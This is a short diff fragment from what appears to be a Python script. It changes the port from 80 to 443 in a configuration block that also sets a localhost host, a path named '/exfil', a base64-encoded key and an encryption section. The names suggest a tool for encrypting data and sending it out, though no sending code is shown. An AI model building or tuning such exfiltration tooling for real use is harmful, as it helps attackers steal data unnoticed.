@@ -9,7 +9,7 @@ base64_key = base64.b64encode(key).decode()
 
 # === CONFIGURATION ===
 host = "127.0.0.1"
-port = "80"
+port = "443"
 path = "/exfil"
 
 # === ENCRYPT FUNCTION ===
